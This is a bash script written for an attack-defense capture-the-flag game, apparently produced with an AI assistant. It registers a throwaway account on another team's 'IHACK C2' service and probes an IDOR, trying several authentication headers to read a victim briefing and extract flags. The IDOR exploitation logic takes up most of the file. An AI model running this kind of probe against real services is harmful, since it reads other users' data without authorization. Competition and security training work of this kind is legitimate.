#!/usr/bin/env bash
# IHACK C2 (port 8043) IDOR + auth-method probe.
# Registers a throwaway account, prints the register response, then reads a
# victim briefing FOUR ways to find which auth the service accepts. Whichever
# prints a flag is the method the real exploit must use.
#
# Usage:
#   ./attack/test_ihackc2.sh <IP> <brief_id> [note_id]
#   ./attack/test_ihackc2.sh                 # team-14 example
set -uo pipefail

IP="${1:-10.80.14.2}"
BRIEF="${2:-}"
NOTE="${3:-}"
B="http://$IP:8043"
CJ="$(mktemp)"
FLAG_RE='[A-Z0-9]{31}='
UUID='[0-9a-fA-F-]\{36\}'

# Auto-fetch fresh ids from the ihack attack-data feed if not passed as args.
if [[ -z "$BRIEF" || -z "$NOTE" ]]; then
  TEAM="$(printf '%s' "$IP" | grep -oE '[0-9]+' | sed -n '3p')"   # 10.80.N.2 -> N
  echo "[*] fetching fresh ids for team $TEAM from ihack attack-info..."
  for SLUG in "${IHACK_SERVICE:-ihackc2}" ihackc2 c2; do
    DUMP="$(ihack attack-info "$SLUG" "$TEAM" 2>/dev/null)"
    [[ -z "$DUMP" ]] && DUMP="$(ihack attack-info "$SLUG" 2>/dev/null | grep "$IP")"
    [[ -n "$DUMP" ]] && { echo "    (slug: $SLUG)"; break; }
  done
  [[ -z "$BRIEF" ]] && BRIEF="$(printf '%s' "$DUMP" | grep -o "\"brief\":\"$UUID\"" | head -1 | grep -oE "$UUID")"
  [[ -z "$NOTE"  ]] && NOTE="$(printf '%s' "$DUMP" | grep -o "\"note\":\"$UUID\""  | head -1 | grep -oE "$UUID")"
  echo "    brief=$BRIEF"
  echo "    note =$NOTE"
  if [[ -z "$BRIEF" && -z "$NOTE" ]]; then
    echo "[-] could not fetch ids. Run 'ihack services' for the slug, or pass ids:"
    echo "    ./attack/test_ihackc2.sh $IP <brief_id> <note_id>"
    exit 1
  fi
fi

echo "[*] target $B"
echo "[*] register response:"
REG="$(curl -s -c "$CJ" -X POST "$B/api/auth/register" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"zz$RANDOM$RANDOM\",\"password\":\"Passw0rd$RANDOM\",\"callsign\":\"zz\"}")"
echo "    $REG"

TOKEN="$(printf '%s' "$REG" | python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("token",""))
except Exception: print("")' 2>/dev/null)"
echo "[*] token = ${TOKEN:-<none>}"
echo "[*] cookie jar:"; sed -n 's/^/    /p' "$CJ" 2>/dev/null | grep -i c2 || echo "    (no c2 cookies)"
echo

try() {  # name  curl-args...
  local name="$1"; shift
  local out; out="$(curl -s "$@" "$B/api/briefings/$BRIEF")"
  local hit; hit="$(printf '%s' "$out" | grep -Eo "$FLAG_RE" | head -1)"
  if [[ -n "$hit" ]]; then
    echo "[+] $name  ->  FLAG: $hit"
  else
    echo "[-] $name  ->  $out"
  fi
}

echo "[*] trying each auth method against /api/briefings/$BRIEF :"
try "B Authorization:Bearer (CONFIRMED)" -H "Authorization: Bearer $TOKEN"
try "A cookie-jar      " -b "$CJ"
try "C Authorization:raw " -H "Authorization: $TOKEN"

rm -f "$CJ"
echo
echo "Whichever line shows FLAG is the auth method. Tell Claude the letter"
echo "(and if none hit, paste the register response above)."
